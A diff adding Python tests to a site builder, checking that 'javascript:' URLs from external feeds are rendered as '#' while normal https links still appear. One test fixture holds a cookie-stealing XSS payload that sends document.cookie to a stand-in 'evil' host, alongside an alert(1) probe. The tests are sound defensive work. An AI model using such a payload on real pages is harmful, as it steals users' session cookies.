@@ -40,6 +40,24 @@ def test_site_shows_the_conflict_resolution_map():
     assert "conflict_decisions.txt" in html         # tells the operator where to decide
 
 
+def test_a_javascript_url_from_a_source_is_never_a_clickable_link():
+    # URLs on the public page come from external feeds (arXiv/OpenAlex/forum/doktores metadata);
+    # a javascript:/data: scheme must be neutralised to '#', not rendered as an href.
+    data = _data({
+        "notes": [{"note": "a note", "source": "javascript:fetch('//evil/'+document.cookie)"}],
+        "doktores_review": [{"title": "paper", "url": "javascript:alert(1)", "cycle": 1}],
+    })
+    html = site.build(data)
+    assert "javascript:" not in html                    # no dangerous scheme reaches the page
+    assert "href='#'" in html                            # it was dropped to a safe fragment
+
+
+def test_a_normal_http_source_url_still_renders():
+    data = _data({"notes": [{"note": "n", "source": "https://arxiv.org/abs/2401.1"}]})
+    html = site.build(data)
+    assert "https://arxiv.org/abs/2401.1" in html
+
+
 def test_site_persona_and_resolve_are_empty_by_default():
     html = site.build(_data({}))
     assert "Noch keine Lehre" in html and "Gerade nichts zu entscheiden" in html
